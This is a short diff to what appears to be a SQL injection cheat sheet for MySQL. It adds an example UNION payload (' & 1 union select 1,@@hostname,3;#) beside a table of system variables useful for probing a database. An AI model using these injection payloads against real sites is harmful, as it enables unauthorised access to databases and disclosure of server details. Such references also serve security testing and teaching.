@@ -55,6 +55,10 @@ IF the developer only allow one row
 ' & 1 union select 1,2,3;#
 ```
 
+MySQL database schema
+
+
+
 ```text
 Variable/Function		Output
 @@hostname	:	Current Hostname
@@ -74,3 +78,13 @@ session_user()	:	Session user
 @@GLOBAL.have_symlink	:	Check if Symlink Enabled or Disabled
 @@GLOBAL.have_ssl	:	Check if it have ssl or not
 ```
+
+
+Can use follow query to display (Example)
+
+```text
+' & 1 union select 1,@@hostname,3;#
+```
+
+
+
